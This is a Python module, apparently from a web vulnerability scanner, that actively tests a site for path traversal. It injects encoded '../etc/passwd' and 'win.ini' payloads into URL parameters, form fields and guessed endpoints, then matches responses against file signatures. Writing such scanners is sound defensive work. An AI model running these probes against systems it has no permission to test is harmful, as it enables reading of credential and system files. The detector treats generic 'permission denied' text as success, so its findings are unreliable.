"""
Active Path Traversal Testing Module
Tests for directory traversal and local file inclusion vulnerabilities
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
import re

def test_path_traversal(scanner):
    """
    Test for path traversal vulnerabilities
    """
    try:
        response = scanner.get_cached_response(scanner.target_url)
        if not response:
            return
        
        # Test URL parameters for path traversal
        _test_url_params_traversal(scanner)
        
        # Test forms for path traversal
        _test_form_traversal(scanner, response)
        
        # Test common vulnerable endpoints
        _test_common_endpoints(scanner)
        
    except Exception as e:
        print(f"Path traversal testing error: {e}")

def _test_url_params_traversal(scanner):
    """Test URL parameters for path traversal"""
    parsed = urlparse(scanner.target_url)
    params = parse_qs(parsed.query)
    
    if not params:
        return
    
    # Parameters commonly vulnerable to path traversal
    traversal_params = ['file', 'path', 'page', 'document', 'folder', 'root', 'pg', 
                        'style', 'template', 'php_path', 'doc', 'filename', 'name',
                        'include', 'dir', 'action', 'board', 'date', 'detail', 'download',
                        'prefix', 'include', 'inc', 'locate', 'show', 'site', 'type', 'view']
    
    # Path traversal payloads
    payloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '....//....//....//etc/passwd',
        '..%2F..%2F..%2Fetc%2Fpasswd',
        '..%5c..%5c..%5cwindows%5cwin.ini',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....\\\\....\\\\....\\\\windows\\\\win.ini'
    ]
    
    for param_name in params.keys():
        param_lower = param_name.lower()
        
        # Check if parameter name suggests file/path handling
        is_file_param = any(keyword in param_lower for keyword in traversal_params)
        
        if is_file_param:
            for payload in payloads:
                try:
                    # Create modified URL with traversal payload
                    modified_params = params.copy()
                    modified_params[param_name] = [payload]
                    
                    query_string = urlencode(modified_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        query_string,
                        parsed.fragment
                    ))
                    
                    test_response = scanner.session.get(test_url, timeout=scanner.timeout, allow_redirects=False)
                    
                    # Check for path traversal indicators
                    if _check_traversal_success(test_response, payload):
                        scanner.add_finding(
                            severity='CRITICAL',
                            category='Path Traversal',
                            title=f'🚨 Path Traversal Vulnerability in "{param_name}" Parameter',
                            description=f'**CRITICAL PATH TRAVERSAL VULNERABILITY DETECTED**\n\n'
                                      f'Parameter: {param_name}\n'
                                      f'Payload: {payload}\n'
                                      f'URL: {test_url}\n\n'
                                      f'**EXPLOITATION EVIDENCE:**\n'
                                      f'The application appears to process file path parameters without proper validation.\n\n'
                                      f'**ATTACK DEMONSTRATION:**\n'
                                      f'```\n'
                                      f'{test_url}\n'
                                      f'```\n\n'
                                      f'**POTENTIAL IMPACT:**\n'
                                      f'- Read sensitive system files (/etc/passwd, win.ini)\n'
                                      f'- Access configuration files with credentials\n'
                                      f'- Read application source code\n'
                                      f'- Bypass authentication mechanisms\n',
                            url=scanner.target_url,
                            remediation='Implement strict path validation, use whitelist of allowed files, avoid user input in file paths'
                        )
                        break
                        
                except Exception:
                    continue

def _test_form_traversal(scanner, response):
    """Test form fields for path traversal"""
    try:
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        
        if not forms:
            return
        
        payloads = ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini']
        
        for form in forms[:3]:  # Test first 3 forms
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            form_url = urljoin(scanner.target_url, action) if action else scanner.target_url
            
            inputs = form.find_all(['input', 'textarea'])
            file_inputs = [inp for inp in inputs if 'file' in inp.get('name', '').lower() or 
                          'path' in inp.get('name', '').lower() or
                          'doc' in inp.get('name', '').lower()]
            
            if file_inputs:
                for payload in payloads:
                    try:
                        data = {inp.get('name', f'field_{i}'): payload 
                               for i, inp in enumerate(file_inputs)}
                        
                        if method == 'post':
                            test_response = scanner.session.post(form_url, data=data, 
                                                                timeout=scanner.timeout, allow_redirects=False)
                        else:
                            test_response = scanner.session.get(form_url, params=data, 
                                                               timeout=scanner.timeout, allow_redirects=False)
                        
                        if _check_traversal_success(test_response, payload):
                            scanner.add_finding(
                                severity='HIGH',
                                category='Path Traversal',
                                title='Path Traversal in Form Submission',
                                description=f'Form action: {form_url}\nVulnerable fields: {[inp.get("name") for inp in file_inputs]}\n\n'
                                          f'The form allows path traversal attacks through file/path parameters.',
                                url=scanner.target_url,
                                remediation='Validate and sanitize all file path inputs'
                            )
                            break
                            
                    except Exception:
                        continue
                        
    except Exception as e:
        print(f"Form traversal testing error: {e}")

def _test_common_endpoints(scanner):
    """Test common endpoints vulnerable to path traversal"""
    common_paths = [
        '/download?file=../../../etc/passwd',
        '/get?path=..\\..\\..\\windows\\win.ini',
        '/read?document=../../../etc/passwd',
        '/view?page=....//....//....//etc/passwd',
        '/include?template=../../../etc/passwd',
        '/file?name=..%2F..%2F..%2Fetc%2Fpasswd'
    ]
    
    for path in common_paths:
        try:
            test_url = urljoin(scanner.base_url, path)
            response = scanner.session.get(test_url, timeout=scanner.timeout, allow_redirects=False)
            
            if _check_traversal_success(response, path):
                scanner.add_finding(
                    severity='HIGH',
                    category='Path Traversal',
                    title='Path Traversal in Common Endpoint',
                    description=f'Vulnerable endpoint: {test_url}\n\n'
                              f'The endpoint allows directory traversal attacks.',
                    url=test_url,
                    remediation='Implement proper path validation and access controls'
                )
                
        except Exception:
            continue

def _check_traversal_success(response, payload):
    """Check if path traversal was successful"""
    if response.status_code != 200:
        return False
    
    content = response.text.lower()
    
    # Linux/Unix indicators
    linux_indicators = [
        'root:x:0:0',
        'bin/bash',
        'nobody:',
        '/home/',
        'daemon:x:'
    ]
    
    # Windows indicators  
    windows_indicators = [
        'for 16-bit app support',
        '[fonts]',
        '[extensions]',
        'mci extensions',
        '[mail]'
    ]
    
    # Check for file content indicators
    if any(indicator in content for indicator in linux_indicators + windows_indicators):
        return True
    
    # Check for error messages that suggest the path exists
    error_patterns = [
        'failed to open stream',
        'permission denied',
        'access denied',
        'file not found in expected location'
    ]
    
    return any(pattern in content for pattern in error_patterns)
